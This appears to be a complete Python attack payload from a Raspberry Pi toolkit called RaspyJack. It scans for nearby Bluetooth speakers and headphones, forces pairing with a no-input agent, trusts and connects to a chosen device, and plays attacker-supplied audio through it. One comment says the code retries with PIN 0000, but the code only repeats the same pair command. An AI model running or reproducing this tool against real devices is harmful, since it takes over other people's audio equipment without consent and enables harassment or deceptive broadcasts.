#!/usr/bin/env python3
# @name: Bluetooth Audio Injection
# @desc: Scan for Bluetooth A2DP devices (speakers, headphones), attempt pairing, and play audio through the target device.
# @category: bluetooth
# @danger: true
# @active: true
# @web: true
"""
RaspyJack Payload -- Bluetooth Audio Injection
===============================================
Author: 7h30th3r0n3

Scan for Bluetooth A2DP devices (speakers, headphones), attempt pairing,
and play audio through the target device.

Setup / Prerequisites
---------------------
- Bluetooth adapter (hci0)
- apt install bluez pulseaudio-module-bluetooth (or bluealsa)
- Audio file at $CITYPOP_ROOT/config/bt_audio/payload.wav
  (or default system beep is used)

Controls
--------
  python3 bt_audio_inject.py [target_mac] [audio_file]

    target_mac   -- optional Bluetooth Classic MAC address
                     (AA:BB:CC:DD:EE:FF) to connect to directly. If
                     omitted, a scan runs and you pick a target from a
                     numbered list ('*' marks A2DP-capable devices).
    audio_file   -- optional path to a .wav file to play (default:
                     AUDIO_FILE below, or a generated 440Hz tone).

  If more than one Bluetooth adapter is present, you'll be prompted to
  pick one from a numbered list.

  Ctrl-C       -- stop playback, disconnect, and exit
"""

from payloads._web_input import request_input
import os
import sys
import time
import re
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

from payloads._iface_helper import list_bt_interfaces

# ── Constants ────────────────────────────────────────────────────────────────
HCI_DEV = None  # set in main() via _select_bt_interface
AUDIO_FILE = os.path.join(os.environ.get("CITYPOP_ROOT", os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))), 'config', 'bt_audio', 'payload.wav')

# ── Shared state ─────────────────────────────────────────────────────────────
lock = threading.Lock()
devices = []          # [{addr, name, a2dp: bool}]
connected_addr = ""
connection_status = ""
playback_status = ""
status_msg = "Idle"
play_proc = None
_scan_active = False


# ── HCI helpers ──────────────────────────────────────────────────────────────

def _hci_up():
    subprocess.run(["sudo", "systemctl", "stop", "bluetooth"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "hciconfig", HCI_DEV, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "hciconfig", HCI_DEV, "up"],
                   capture_output=True, timeout=5)
    time.sleep(0.3)


# ── Scan for BT Classic devices (bluetoothctl) ────────────────────────────────

def _scan_devices():
    """Scan for BT Classic devices using bluetoothctl."""
    global status_msg, _scan_active

    with lock:
        _scan_active = True
        status_msg = "Scanning..."

    _hci_up()
    found = []

    try:
        # Start bluetoothctl scan for classic devices
        proc = subprocess.Popen(
            ["sudo", "bluetoothctl"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        proc.communicate(
            input="power on\nscan on\n",
            timeout=12,
        )
    except (subprocess.TimeoutExpired, Exception):
        try:
            proc.kill()
        except Exception:
            pass

    time.sleep(0.5)

    # Collect discovered devices
    try:
        result = subprocess.run(
            ["bluetoothctl", "devices"],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            match = re.match(r"Device\s+([0-9A-Fa-f:]{17})\s+(.*)", line)
            if match:
                addr = match.group(1).upper()
                name = match.group(2).strip() or "(unknown)"
                found.append({"addr": addr, "name": name, "a2dp": False})
    except Exception as exc:
        with lock:
            status_msg = str(exc)[:20]

    # Stop scanning
    try:
        proc = subprocess.Popen(
            ["sudo", "bluetoothctl"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        proc.communicate(input="scan off\nquit\n", timeout=5)
    except Exception:
        try:
            proc.kill()
        except Exception:
            pass

    # Check each device for A2DP service
    for dev in found:
        with lock:
            if not _scan_active:
                break
        try:
            result = subprocess.run(
                ["sudo", "sdptool", "browse", dev["addr"]],
                capture_output=True, text=True, timeout=8,
            )
            if "Audio Sink" in result.stdout or "A2DP" in result.stdout:
                dev["a2dp"] = True
        except Exception:
            pass

    with lock:
        devices.clear()
        devices.extend(found)
        a2dp_count = sum(1 for d in found if d["a2dp"])
        status_msg = f"Found {len(found)} ({a2dp_count} A2DP)"
        _scan_active = False


# ── Pairing / connection ────────────────────────────────────────────────────

def _btctl_cmd(commands, timeout_sec=10):
    """Send commands to bluetoothctl and return output."""
    try:
        proc = subprocess.Popen(
            ["sudo", "bluetoothctl"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        input_str = "\n".join(commands) + "\nquit\n"
        stdout, _ = proc.communicate(input=input_str, timeout=timeout_sec)
        return stdout
    except subprocess.TimeoutExpired:
        try:
            proc.kill()
        except Exception:
            pass
        return ""
    except Exception:
        return ""


def _connect_device(addr):
    """Attempt to pair and connect to a BT audio device."""
    global connected_addr, connection_status, status_msg

    with lock:
        connection_status = "Pairing..."
        status_msg = f"Pairing {addr[-8:]}"

    # Power on, set agent, try pairing
    _btctl_cmd(["power on", "agent NoInputNoOutput", "default-agent"])
    time.sleep(0.5)

    output = _btctl_cmd([
        f"pair {addr}",
    ], timeout_sec=15)

    paired = "Pairing successful" in output or "already exists" in output.lower()

    if not paired:
        # Try with PIN 0000
        output = _btctl_cmd([
            f"pair {addr}",
        ], timeout_sec=10)

    with lock:
        connection_status = "Connecting..."
        status_msg = f"Connecting {addr[-8:]}"

    # Trust and connect
    _btctl_cmd([f"trust {addr}"], timeout_sec=5)
    time.sleep(0.5)
    output = _btctl_cmd([f"connect {addr}"], timeout_sec=15)

    if "Connection successful" in output or "Connected: yes" in output:
        with lock:
            connected_addr = addr
            connection_status = "Connected"
            status_msg = f"Connected {addr[-8:]}"
    else:
        with lock:
            connection_status = "Failed"
            status_msg = "Connection failed"


def _disconnect_device():
    """Disconnect from the current device."""
    global connected_addr, connection_status
    with lock:
        addr = connected_addr
    if addr:
        _btctl_cmd([f"disconnect {addr}"], timeout_sec=5)
    with lock:
        connected_addr = ""
        connection_status = "Disconnected"


# ── Audio playback ───────────────────────────────────────────────────────────

def _play_audio():
    """Play audio through the connected BT device."""
    global play_proc, playback_status, status_msg

    audio_path = AUDIO_FILE
    if not os.path.isfile(audio_path):
        # Generate a simple beep using sox if available
        try:
            subprocess.run(
                ["sox", "-n", audio_path, "synth", "5", "sine", "440"],
                capture_output=True, timeout=10,
            )
        except Exception:
            with lock:
                playback_status = "No audio file"
                status_msg = "No audio file"
            return

    with lock:
        playback_status = "Playing..."
        status_msg = "Playing audio"

    try:
        # Try paplay (PulseAudio) first, fall back to aplay
        for player in ["paplay", "aplay"]:
            try:
                proc = subprocess.Popen(
                    ["sudo", player, audio_path],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                )
                with lock:
                    play_proc = proc
                proc.wait(timeout=120)
                with lock:
                    playback_status = "Done"
                    status_msg = "Playback done"
                    play_proc = None
                return
            except FileNotFoundError:
                continue
            except subprocess.TimeoutExpired:
                proc.kill()
                break

        with lock:
            playback_status = "No player found"
            status_msg = "No audio player"

    except Exception as exc:
        with lock:
            playback_status = f"Error: {str(exc)[:14]}"
            status_msg = "Playback error"
            play_proc = None


def _stop_playback():
    """Stop current audio playback."""
    global playback_status
    with lock:
        p = play_proc
    if p:
        try:
            p.terminate()
            p.wait(timeout=3)
        except Exception:
            try:
                p.kill()
            except Exception:
                pass
    with lock:
        playback_status = "Stopped"


# ── Bluetooth adapter selection ─────────────────────────────────────────────

def _select_bt_interface():
    """Detect BT interfaces and pick one. Prompts if more than one is found."""
    ifaces = list_bt_interfaces()

    if not ifaces:
        print("No Bluetooth adapter found.", flush=True)
        return None

    if len(ifaces) == 1:
        chosen = ifaces[0]
        if not chosen["is_up"]:
            subprocess.run(["sudo", "hciconfig", chosen["name"], "up"],
                           capture_output=True, timeout=5)
        return chosen["name"]

    print("Multiple Bluetooth adapters found:", flush=True)
    for i, ifc in enumerate(ifaces):
        mac = ifc["mac"] or "?"
        state = "UP" if ifc["is_up"] else "DOWN"
        print(f"  [{i}] {ifc['name']}  {ifc['bus'] or '?'}  {mac}  {state}", flush=True)

    while True:
        choice = str(request_input("Select Bluetooth adapter", input_type="select", choices=[
            {"value": str(i), "label": f"{item['name']} · {item.get('bus') or 'unknown'} · {item.get('mac') or 'no address'} · {'UP' if item.get('is_up') else 'DOWN'}"}
            for i, item in enumerate(ifaces)]))
        if choice.isdigit() and 0 <= int(choice) < len(ifaces):
            chosen = ifaces[int(choice)]
            if not chosen["is_up"]:
                subprocess.run(["sudo", "hciconfig", chosen["name"], "up"],
                               capture_output=True, timeout=5)
            return chosen["name"]
        print("Invalid selection, try again.", flush=True)


# ── Target selection ─────────────────────────────────────────────────────────

def _select_target():
    """Scan for BT Classic/A2DP devices and let the operator pick one by number."""
    print("Scanning for Bluetooth devices (A2DP check included)...", flush=True)
    _scan_devices()

    with lock:
        devs = list(devices)
        msg = status_msg

    print(msg, flush=True)
    if not devs:
        return None

    for i, dev in enumerate(devs):
        tag = "*" if dev["a2dp"] else " "
        print(f"  [{i}] {tag} {dev['addr']}  {dev['name']}", flush=True)
    print("  (* = A2DP capable)", flush=True)

    while True:
        choice = str(request_input("Select Bluetooth target", input_type="select", choices=[
            {"value": str(i), "label": f"{item.get('name') or 'unknown'} · {item.get('addr') or 'no address'}"}
            for i, item in enumerate(devs)]))
        if choice.isdigit() and 0 <= int(choice) < len(devs):
            return devs[int(choice)]["addr"]
        print("Invalid selection, try again.", flush=True)


_MAC_RE = re.compile(r"^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$")


# ── Main ─────────────────────────────────────────────────────────────────────

def _usage():
    print(f"Usage: {os.path.basename(__file__)} [target_mac] [audio_file]", flush=True)
    print("  target_mac   Bluetooth Classic MAC, e.g. AA:BB:CC:DD:EE:FF "
          "(optional; omit to scan and pick a target)", flush=True)
    print(f"  audio_file   path to a .wav file to play (default: {AUDIO_FILE})", flush=True)


def main():
    global status_msg, HCI_DEV, AUDIO_FILE

    args = sys.argv[1:]
    if args and args[0] in ("-h", "--help"):
        _usage()
        return 0

    target = None
    if args and _MAC_RE.match(args[0]):
        target = args[0].upper()
        args = args[1:]

    if args:
        AUDIO_FILE = args[0]

    HCI_DEV = _select_bt_interface()
    if not HCI_DEV:
        return 1

    os.makedirs(os.path.dirname(AUDIO_FILE) or ".", exist_ok=True)

    if not target:
        target = _select_target()
        if not target:
            print("No target selected. Exiting.", flush=True)
            return 1

    try:
        print(f"Connecting to {target} ...", flush=True)
        _connect_device(target)
        with lock:
            conn_status = connection_status

        if conn_status != "Connected":
            print(f"Connection failed: {conn_status}", flush=True)
            return 1

        print(f"Connected to {target}. Playing {AUDIO_FILE} ...", flush=True)
        _play_audio()
        with lock:
            play_status = playback_status
        print(f"Playback: {play_status}", flush=True)

    except KeyboardInterrupt:
        print("\nInterrupted, stopping...", flush=True)
    finally:
        _stop_playback()
        _disconnect_device()
        subprocess.run(["sudo", "systemctl", "start", "bluetooth"],
                       capture_output=True, timeout=5)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
